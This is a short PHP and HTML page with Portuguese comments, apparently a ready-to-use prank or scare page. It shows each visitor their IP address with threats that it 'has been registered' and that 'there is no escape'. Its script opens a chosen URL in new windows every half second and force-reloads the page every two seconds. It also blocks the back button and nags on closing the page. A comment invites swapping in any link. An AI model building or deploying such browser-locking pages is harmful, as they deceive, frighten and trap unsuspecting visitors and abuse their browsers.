<?php
// Captura o endereço de IP do visitante.
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'IP Desconhecido';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Você foi pego!</title>
    <style>
        body { font-family: 'Courier New', monospace; background-color: #000; color: #0f0; text-align: center; padding-top: 10%; }
        h1 { font-size: 2.5em; text-shadow: 0 0 5px #0f0; }
        p { font-size: 1.2em; }
        strong { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
    </style>
</head>
<body>
    <h1>VOCÊ NÃO DEVERIA ESTAR AQUI.</h1>
    <p>Seu endereço de IP (<strong><?php echo htmlspecialchars($ip_address); ?></strong>) foi registrado.</p>
    <p>Não há escapatória. A única saída é fechar esta guia.</p>
    <img src="../../assets/auth_pic.jpeg" alt="bubaiado" width="400" />

    <script type="text/javascript">
        // IMPORTANTE: Substitua a URL abaixo pelo link que você deseja abrir.
        const urlParaAbrir = 'https://www.youtube.com/watch?v=wKnfyrGZwA0&pp=ygUKbW9ua3kgZmxpcA%3D%3D';

        // 1. Tenta abrir o link incessantemente.
        // A maioria dos navegadores bloqueará as tentativas após a primeira.
        setInterval(function() {
            window.open(urlParaAbrir, '_blank');
        }, 500); // Tenta abrir a cada 0.5 segundos.

        // 2. Recarrega a página incessantemente.
        setInterval(function() {
            location.reload(true); // O 'true' força o recarregamento a partir do servidor.
        }, 2000); // Recarrega a cada 2 segundos.

        // 3. Desabilita o botão "voltar" do navegador.
        history.pushState(null, null, location.href);
        window.addEventListener('popstate', function () {
            history.go(1);
        });

        // 4. Exibe uma mensagem de confirmação ao tentar fechar a página.
        window.addEventListener('beforeunload', function (e) {
            const confirmationMessage = 'Não há escapatória. Tem certeza que quer tentar sair?';
            e.returnValue = confirmationMessage; // Padrão para a maioria dos navegadores
            return confirmationMessage;          // Padrão legado
        });
    </script>
</body>
</html>